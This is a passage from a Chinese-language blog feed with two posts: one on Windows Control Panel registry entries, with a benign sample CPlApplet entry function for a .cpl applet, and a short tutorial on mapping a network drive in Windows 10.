GUID，它们通常与桌面上的文件夹快捷方式相关联，而不是直接与控制面板项。例如，一个 GUID 可能指向一个包含多个控制面板项的文件夹，这些项在桌面上以单个图标的形式显示。</p><p>要获取特定 GUID 与其对应的项目或文件夹之间的确切关系，你需要查看注册表中的具体条目，并可能需要参考 Windows 内部文档或在线资源。但是，通常不建议直接修改这些条目，除非你确切知道自己在做什么，并且有备份或恢复计划，以防出现问题。</p><h2 id="0x03-新建一个控制面板项目"><a href="#0x03-新建一个控制面板项目" class="headerlink" title="0x03 新建一个控制面板项目"></a>0x03 新建一个控制面板项目</h2><p>通常如果需要新建一个控制面板项目，则需要在 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cputs</code> 路径下添加一个注册表项，并且注册表项需要指向 cpl 文件，如下图所示：</p><img src="/A_OS/Windows/%E3%80%90%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E3%80%91%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%B8%E5%85%B3/image-20240221102814248.png" class="" title="image-20240221102814248"><h2 id="0x04-编写一个控制面板程序"><a href="#0x04-编写一个控制面板程序" class="headerlink" title="0x04 编写一个控制面板程序"></a>0x04 编写一个控制面板程序</h2><p>参考项目：<a href="https://github.com/gtrubach/MyCPLApplet">gtrubach&#x2F;MyCPLApplet: Example of creating control panel applets in Windows.</a></p><p>cpl 文件类似 dll 文件，入口函数不同，加载逻辑基本一致：</p><p>若口函数如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">LONG APIENTRY <span class="title">CPlApplet</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hwndCPL,       <span class="comment">// handle of Control Panel window</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,          <span class="comment">// message</span></span></span></span><br><span class="line"><span class="params"><span class="function">LONG_PTR lParam1,       <span class="comment">// first message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">LONG_PTR lParam2        <span class="comment">// second message parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">AFX_MANAGE_STATE</span>(<span class="built_in">AfxGetStaticModuleState</span>());</span><br><span class="line"></span><br><span class="line">LPCPLINFO lpCPlInfo;</span><br><span class="line">LONG retCode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CPL_INIT:              <span class="comment">// first message, sent once</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CPL_GETCOUNT:          <span class="comment">// second message, sent once</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1L</span>;                <span class="comment">// (LONG)NUM_APPLETS;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CPL_INQUIRE:        <span class="comment">// third message, sent once per app</span></span><br><span class="line">lpCPlInfo = (LPCPLINFO)lParam2;</span><br><span class="line"></span><br><span class="line">lpCPlInfo-&gt;idIcon = IDI_SAMPLE_CPL;</span><br><span class="line">lpCPlInfo-&gt;idName = IDS_SAMPLE_CPL_NAME;</span><br><span class="line">lpCPlInfo-&gt;idInfo = IDS_SAMPLE_CPL_DESCRIPTION;</span><br><span class="line">lpCPlInfo-&gt;lData = <span class="number">0L</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CPL_DBLCLK:            <span class="comment">// application icon double-clicked</span></span><br><span class="line">&#123;</span><br><span class="line">CWnd wndCPL;</span><br><span class="line">BOOL b = wndCPL.<span class="built_in">Attach</span>(hwndCPL);</span><br><span class="line"><span class="function">CMyPropertySheet <span class="title">propSheet</span><span class="params">(IDS_SAMPLE_CPL_NAME, &amp;wndCPL)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is where you would retrieve information from the property</span></span><br><span class="line"><span class="comment">// sheet if propSheet.DoModal() returned IDOK.  We aren&#x27;t doing</span></span><br><span class="line"><span class="comment">// anything for simplicity.</span></span><br><span class="line"></span><br><span class="line">propSheet.<span class="built_in">DoModal</span>();</span><br><span class="line">wndCPL.<span class="built_in">Detach</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> retCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：控制面板相关注册表，以及控制面板程序开发&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    
    <category term="win" scheme="http://example.com/tags/win/"/>
    
  </entry>
  
  <entry>
    <title>【环境搭建】映射网络驱动器</title>
    <link href="http://example.com/A_OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E3%80%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%91%E6%98%A0%E5%B0%84%E7%BD%91%E7%BB%9C%E9%A9%B1%E5%8A%A8%E5%99%A8/"/>
    <id>http://example.com/A_OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E3%80%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%91%E6%98%A0%E5%B0%84%E7%BD%91%E7%BB%9C%E9%A9%B1%E5%8A%A8%E5%99%A8/</id>
    <published>2024-02-18T16:00:00.000Z</published>
    <updated>2024-02-19T10:19:50.981Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：win10 搭建网络映射驱动器</p><p>网络驱动器：即把网络中的磁盘映射到本地，以便于网络内的机器共享。</p><p>场景：考虑有这么个场景：你的主机存储快没了，你也不想自己装块硬盘，正好还有台闲置电脑，那么可以考虑把那台闲置电脑的存储映射到你的主机上，从而实现扩容。所以本教程想实现的就是这么个目的。</p></blockquote><span id="more"></span><p>现有 机器A 和 机器B，想在机器A上通过网络映射的方式扩展机器A的存储 (共享机器B的存储)，操作方法如下。</p><h2 id="0x01-机器B-添加共享文件夹"><a href="#0x01-机器B-添加共享文件夹" class="headerlink" title="0x01 机器B 添加共享文件夹"></a>0x01 机器B 添加共享文件夹</h2><p>创建共享文件夹</p><img src="/A_OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E3%80%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%91%E6%98%A0%E5%B0%84%E7%BD%91%E7%BB%9C%E9%A9%B1%E5%8A%A8%E5%99%A8/image-20240219111751233.png" class="" title="image-20240219111751233"><p>复制共享路径</p><img src="/A_OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E3%80%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%91%E6%98%A0%E5%B0%84%E7%BD%91%E7%BB%9C%E9%A9%B1%E5%8A%A8%E5%99%A8/image-20240219111835270.png" class="" title="image-20240219111835270"><h2 id="0x02-机器A-映射网络驱动器"><a href="#0x02-机器A-映射网络驱动器" class="headerlink" title="0x02 机器A 映射网络驱动器"></a>0x02 机器A 映射网络驱动器</h2><img src="/A_OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E3%80%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%91%E6%98%A0%E5%B0%84%E7%BD%91%E7%BB%9C%E9%A9%B1%E5%8A%A8%E5%99%A8/image-20240219112104944.png" class="" title="image-20240219112104944"><h2 id="0x03-相关补充"><a href="#0x03-相关补充" class="headerlink" title="0x03 相关补充"></a>0x03 相关补充</h2><p>如果要获取相关信息，参考微软文档 <a href="https://learn.microsoft.com/zh-cn/windows/win32/wnet/windows-networking-wnet-">Windows 网络 (WNet) - Win32 apps | Microsoft Learn</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：win10 搭建网络映射驱动器&lt;/p&gt;
&lt;p&gt;网络驱动器：即把网络中的磁盘映射到本地，以便于网络内的机器共享。&lt;/p&gt;
&lt;p&gt;场景：考虑有这么个场景：你的主机存储快没了，你也不想自己装块硬盘，正好还有台闲置电脑，那么可以考虑把那台闲置电脑的存储映射到你的主机上，从而实现扩容。所以本教程想实现的就是这么个目的。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="环境搭建" scheme="http://example.com/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="win" scheme="http://example.com/tags/win/"/>
    
    <category term="驱动器" scheme="http://example.com/tags/%E9%A9%B1%E5%8A%A8%E5%99%A8/"/>
    
  </entry>
  
</feed>
